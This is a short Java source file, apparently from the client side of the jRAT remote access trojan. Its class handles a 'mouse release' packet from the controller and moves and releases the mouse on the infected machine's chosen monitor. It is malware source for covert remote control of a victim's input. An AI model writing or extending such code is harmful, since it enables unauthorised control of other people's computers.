package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.utils.ScreenUtils;
import jrat.common.utils.Utils;

public class Packet93MouseRelease implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int x = con.readInt();
		int y = con.readInt();
		int btn = con.readInt();
		int monitor = con.readInt();
		
		if (!Utils.isHeadless()) {
			if (monitor == -1) {
				ScreenUtils.getDefault().mouseMove(x, y);
				ScreenUtils.getDefault().mouseRelease(btn);
			} else {
				ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
				ScreenUtils.getAllRobots()[monitor].mouseRelease(btn);
			}
		}
	}

}
